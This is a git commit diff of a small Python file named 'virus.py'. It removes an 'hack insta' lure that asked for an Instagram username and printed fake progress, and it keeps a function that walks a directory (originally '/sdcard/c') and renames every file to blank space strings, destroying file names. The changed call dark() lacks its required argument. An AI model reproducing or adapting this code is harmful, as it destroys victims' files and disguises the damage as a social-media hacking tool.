232c39cd613e84ec90760b5807f79351a5a2ac8e
dark <91858665+darkzone964@users.noreply.github.com>
2021-10-31 12:02:20 +0300

    Update virus.py

--- virus.py
+++ virus.py
@@ -1,14 +1,5 @@
 import os
-import pyfiglet
 
-logo = pyfiglet.figlet_format("*hack insta*")
-print(logo)
-
-target = input("insta user ==»: ")
-print(target)
-
-for i in range(10):
-	print("done -_-")
 def dark(path):
 	for dir,dires,files in os.walk(path):
 		virus = len(files)
@@ -16,4 +7,4 @@ def dark(path):
 			ko = dir+"/"+files[o]
 			python = " "*(o+1)
 			os.rename(ko,dir+"/"+python)
-dark('/sdcard/c')
+dark()
